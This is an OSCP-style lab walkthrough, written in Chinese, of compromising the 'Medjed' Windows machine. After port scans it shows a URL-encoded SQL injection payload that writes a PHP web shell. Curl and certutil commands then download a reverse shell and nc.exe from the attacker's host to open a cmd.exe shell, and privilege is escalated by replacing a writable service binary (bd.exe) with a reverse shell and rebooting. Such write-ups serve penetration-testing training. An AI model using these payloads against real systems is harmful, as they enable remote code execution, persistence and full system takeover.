## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Medjed]
└─$ sudo nmap -A -sV -sS -T4 192.168.212.127
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-27 20:39 CST
Nmap scan report for 192.168.212.127
Host is up (0.25s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
| fingerprint-strings:
|   GenericLines, HTTPOptions, Help, JavaRMI, Kerberos, NULL, RPCCheck, SIPOptions, TerminalServer, TerminalServerCookie:
|_    Host '192.168.45.189' is not allowed to connect to this MariaDB server
8000/tcp open  http-alt      BarracudaServer.com (Windows)
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 200 OK
|     Date: Sun, 27 Aug 2023 12:39:50 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GenericLines:
|     HTTP/1.1 200 OK
|     Date: Sun, 27 Aug 2023 12:39:44 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Sun, 27 Aug 2023 12:39:45 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Sun, 27 Aug 2023 12:39:57 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   RTSPRequest:
|     HTTP/1.1 200 OK
|     Date: Sun, 27 Aug 2023 12:39:58 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   SIPOptions:
|     HTTP/1.1 400 Bad Request
|     Date: Sun, 27 Aug 2023 12:41:05 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|     <html><body><h1>400 Bad Request</h1>Can't parse request<p>BarracudaServer.com (Windows)</p></body></html>
|   Socks5:
|     HTTP/1.1 200 OK
|     Date: Sun, 27 Aug 2023 12:39:51 GMT
|     Server: BarracudaServer.com (Windows)
|_    Connection: Close
| http-webdav-scan:
|   Server Date: Sun, 27 Aug 2023 12:42:19 GMT
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: BarracudaServer.com (Windows)
|_http-title: Home
| http-methods:
|_  Potentially risky methods: PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: BarracudaServer.com (Windows)
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3306-TCP:V=7.92%I=7%D=8/27%Time=64EB440A%P=aarch64-unknown-linux-gn
SF:u%r(NULL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.189'\x20is\x20not
SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Gen
SF:ericLines,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.189'\x20is\x20no
SF:t\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(HT
SF:TPOptions,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.189'\x20is\x20no
SF:t\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RP
SF:CCheck,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.189'\x20is\x20not\x
SF:20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Help,
SF:4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.189'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalServ
SF:erCookie,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.189'\x20is\x20not
SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Ker
SF:beros,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.189'\x20is\x20not\x2
SF:0allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SIPOpt
SF:ions,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.189'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Termina
SF:lServer,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.189'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Java
SF:RMI,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.189'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.92%I=7%D=8/27%Time=64EB4410%P=aarch64-unknown-linux-gn
SF:u%r(GenericLines,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2027\x20A
SF:ug\x202023\x2012:39:44\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(W
SF:indows\)\r\nConnection:\x20Close\r\n\r\n")%r(GetRequest,72,"HTTP/1\.1\x
SF:20200\x20OK\r\nDate:\x20Sun,\x2027\x20Aug\x202023\x2012:39:45\x20GMT\r\
SF:nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close
SF:\r\n\r\n")%r(FourOhFourRequest,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20S
SF:un,\x2027\x20Aug\x202023\x2012:39:50\x20GMT\r\nServer:\x20BarracudaServ
SF:er\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(Socks5,72,"H
SF:TTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2027\x20Aug\x202023\x2012:39:51
SF:\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection
SF::\x20Close\r\n\r\n")%r(HTTPOptions,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\
SF:x20Sun,\x2027\x20Aug\x202023\x2012:39:57\x20GMT\r\nServer:\x20Barracuda
SF:Server\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(RTSPRequ
SF:est,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2027\x20Aug\x202023\x2
SF:012:39:58\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nC
SF:onnection:\x20Close\r\n\r\n")%r(SIPOptions,13C,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nDate:\x20Sun,\x2027\x20Aug\x202023\x2012:41:05\x20GMT\r\
SF:nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close
SF:\r\nContent-Type:\x20text/html\r\nCache-Control:\x20no-store,\x20no-cac
SF:he,\x20must-revalidate,\x20max-age=0\r\n\r\n<html><body><h1>400\x20Bad\
SF:x20Request</h1>Can't\x20parse\x20request<p>BarracudaServer\.com\x20\(Wi
SF:ndows\)</p></body></html>");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/27%OT=135%CT=1%CU=31258%PV=Y%DS=4%DC=T%G=Y%TM=64EB44
OS:BD%P=aarch64-unknown-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=I%TS=U)OPS(O1
OS:=M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54E
OS:NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=8
OS:0%W=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(
OS:R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T
OS:7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=D859%RUD=G
OS:)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-08-27T12:42:20
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   297.36 ms 192.168.45.1
2   297.30 ms 192.168.45.254
3   297.42 ms 192.168.251.1
4   297.72 ms 192.168.212.127

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 186.42 seconds
```

去 8000 port 嘗試找服務版本

```http
http://192.168.212.127:8000/rtl/about.lsp
```

此頁面可看到服務為 BarracudaDrive 6.5
![[截圖 2023-08-27 下午8.49.03.png]]
雖有漏洞，但沒發現可利用點，用 nmapAutomater 掃全部的 port

```json
┌──(ouyang㉿kali)-[~/tools/nmapAutomator]
└─$ ./nmapAutomator.sh -H 192.168.212.127 -t full

Running a full scan on 192.168.212.127

Host is likely running Unknown OS!


---------------------Starting Full Scan------------------------



PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5040/tcp  open  unknown
8000/tcp  open  http-alt
30021/tcp open  unknown
33033/tcp open  unknown
44330/tcp open  unknown
45332/tcp open  unknown
45443/tcp open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown



Making a script scan on all ports



PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings:
|   Help, LDAPBindReq, NULL, SIPOptions, afp, oracle-tns:
|_    Host '192.168.45.189' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown
8000/tcp  open  http-alt      BarracudaServer.com (Windows)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-methods:
|_  Potentially risky methods: PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 200 OK
|     Date: Sun, 27 Aug 2023 13:09:43 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GenericLines, GetRequest:
|     HTTP/1.1 200 OK
|     Date: Sun, 27 Aug 2023 13:09:37 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 200 OK
|     Date: Sun, 27 Aug 2023 13:09:50 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   SIPOptions:
|     HTTP/1.1 400 Bad Request
|     Date: Sun, 27 Aug 2023 13:10:57 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|     <html><body><h1>400 Bad Request</h1>Can't parse request<p>BarracudaServer.com (Windows)</p></body></html>
|   Socks5:
|     HTTP/1.1 200 OK
|     Date: Sun, 27 Aug 2023 13:09:44 GMT
|     Server: BarracudaServer.com (Windows)
|_    Connection: Close
|_http-server-header: BarracudaServer.com (Windows)
|_http-title: Home
| http-webdav-scan:
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|   Server Type: BarracudaServer.com (Windows)
|   Server Date: Sun, 27 Aug 2023 13:12:22 GMT
|_  WebDAV type: Unknown
30021/tcp open  ftp           FileZilla ftpd 0.9.41 beta
|_ftp-bounce: bounce working!
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
| -r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
| -r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
| -r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
| -r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
| -r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
|_drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
33033/tcp open  unknown
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
44330/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=server demo 1024 bits/organizationName=Real Time Logic/stateOrProvinceName=CA/countryName=US
| Not valid before: 2009-08-27T14:40:47
|_Not valid after:  2019-08-25T14:40:47
|_ssl-date: 2023-08-27T13:12:52+00:00; 0s from scanner time.
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 200 OK
|     Date: Sun, 27 Aug 2023 13:10:57 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GenericLines:
|     HTTP/1.1 200 OK
|     Date: Sun, 27 Aug 2023 13:09:53 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Sun, 27 Aug 2023 13:09:55 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Sun, 27 Aug 2023 13:09:56 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   RTSPRequest:
|     HTTP/1.1 200 OK
|     Date: Sun, 27 Aug 2023 13:09:57 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   SIPOptions:
|     HTTP/1.1 400 Bad Request
|     Date: Sun, 27 Aug 2023 13:11:15 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|_    <html><body><h1>400 Bad Request</h1>Can't parse request<p>BarracudaServer.com (Windows)</p></body></html>
45332/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-title: Quiz App
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
45443/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Quiz App
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-08-27T13:12:25
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```


發現 port 45332 底下有 phpinfo.php
```http
http://192.168.155.127:45332/phpinfo.php
```


	重連 VPN，IP 換成 192.168.155.127

```http
http://192.168.155.127:33033/test
```

訪問此頁面可看到錯誤導覽，嘗試尋找有用的資料

![[截圖 2023-08-28 下午10.15.33.png]]

```http
http://192.168.155.127:33033/slug?URL=%27
```

發現此頁面可 sql injection

![[截圖 2023-08-28 下午10.17.09.png]]

```sql
sql = "SELECT username FROM users WHERE username = '" + params[:URL].to_s + "'"
```

	重連 VPN，IP 換成 192.168.218.127

```http
http://192.168.218.127:33033/slug?URL=%27+UNION+SELECT+%28%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%29+INTO+OUTFILE+%27C%3A%2Fxampp%2Fhtdocs%2Fcmd3.php%27++--+-%27
```

![[截圖 2023-08-28 下午11.11.19.png]]

透過 sql 上傳 web shell，C:/xampp/htdocs 為依照 phpinfo 得來的 document root

```http
http://192.168.218.127:45332/cmd3.php?cmd=dir
```

成功 RCE!

```http
http://192.168.218.127:45332/cmd3.php?cmd=curl%20http://192.168.45.168:8000/reverse_shell.exe%20--output%20shell.exe
```
![[截圖 2023-08-28 下午11.14.19.png]]

成功上傳 reverse shell

```http
http://192.168.218.127:45332/cmd3.php?cmd=.\shell.exe
```


> [!NOTE] msfvenom
> 用 msfvenom 失敗，改用 nc php shell

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Medjed]
└─$ cat shell.php
<?php echo shell_exec('certutil.exe -urlcache -split -f "http://192.168.45.168:8000/nc.exe" nc.exe && nc.exe -nv 192.168.45.168 30021 -e cmd.exe');?>
```

kali:
```json
┌──(ouyang㉿kali)-[~]
└─$ curl http://192.168.218.127:45332/cmd3.php?cmd=curl+http://192.168.45.168:8000/shell.php+--output+shell.php

┌──(ouyang㉿kali)-[~]
└─$ curl http://192.168.218.127:45332/shell.php
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Medjed]
└─$ nc -nvlp 30021
listening on [any] 30021 ...
connect to [192.168.45.168] from (UNKNOWN) [192.168.218.127] 50220
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>
```

get shell!

### 提權

在 C:\\ 底下看到 bd 資料夾，似乎可利用 48789.txt (也在 bd\\readme.txt 裡面看到 BarracudaDrive 字樣)

```json
C:\>cacls C:\bd
cacls C:\bd
C:\bd BUILTIN\Administrators:(OI)(CI)(ID)F
      NT AUTHORITY\SYSTEM:(OI)(CI)(ID)F
      BUILTIN\Users:(OI)(CI)(ID)R
      NT AUTHORITY\Authenticated Users:(ID)C
      NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C


C:\>cacls C:\bd\bd.exe
cacls C:\bd\bd.exe
C:\bd\bd.exe BUILTIN\Administrators:(ID)F
             NT AUTHORITY\SYSTEM:(ID)F
             BUILTIN\Users:(ID)R
             NT AUTHORITY\Authenticated Users:(ID)C
```

發現 bd folder 一般 user 即可寫入

```json
C:\bd>curl http://192.168.45.168:8000/reverse_shell.exe --output bd.exe
curl http://192.168.45.168:8000/reverse_shell.exe --output bd.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7168  100  7168    0     0   7168      0  0:00:01 --:--:--  0:00:01 10433

C:\bd>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A41E-B108

 Directory of C:\bd

08/28/2023  10:49 AM    <DIR>          .
08/28/2023  10:49 AM    <DIR>          ..
11/03/2020  12:29 PM    <DIR>          applications
11/03/2020  12:29 PM                38 bd.conf
11/03/2020  12:29 PM               259 bd.dat
08/28/2023  10:49 AM             7,168 bd.exe
06/12/2011  04:49 PM               207 bd.lua
04/26/2013  05:55 PM         1,661,648 bd.service.exe
04/26/2013  05:55 PM           912,033 bd.zip
06/14/2012  12:21 PM            33,504 bdctl.exe
11/03/2020  12:29 PM    <DIR>          cache
11/03/2020  12:29 PM    <DIR>          cmsdocs
11/03/2020  12:29 PM    <DIR>          data
12/03/2010  04:52 PM             5,139 install.txt
10/26/2010  04:38 PM           421,200 msvcp100.dll
10/26/2010  04:38 PM           770,384 msvcr100.dll
02/18/2013  10:39 PM           240,219 non-commercial-license.rtf
06/07/2023  07:39 PM                 6 pidfile
04/26/2013  05:50 PM            16,740 readme.txt
11/03/2020  12:29 PM               702 roles.dat
06/14/2012  12:21 PM           383,856 sqlite3.exe
11/03/2020  12:29 PM    <DIR>          themes
06/07/2023  07:39 PM    <DIR>          trace
11/03/2020  12:29 PM           133,107 Uninstall.exe
              16 File(s)      4,586,210 bytes
               8 Dir(s)  16,495,529,984 bytes free

C:\bd>shutdown /r
shutdown /r
```